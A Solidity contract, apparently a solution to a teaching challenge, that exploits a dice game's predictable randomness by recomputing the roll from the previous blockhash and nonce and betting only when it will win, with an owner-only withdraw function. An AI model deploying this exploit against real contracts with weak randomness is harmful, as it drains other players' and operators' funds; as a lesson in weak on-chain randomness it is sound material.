pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import 'hardhat/console.sol';
import './DiceGame.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    error RiggedRoll__rollTooLow();
    error RiggedRoll__notEnoughFunds();

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address payable _to, uint256 _amount) public onlyOwner {
        _to.transfer(_amount);
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable {
        if (address(this).balance < 0.002 ether)
            revert RiggedRoll__notEnoughFunds();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log('THE ROLL IS ', roll);
        if (roll > 2)
            revert RiggedRoll__rollTooLow();
        console.log("THE ROLL IS a WINNER!");
        diceGame.rollTheDice{value : address(this).balance}();
    }

    receive() external payable {}
}
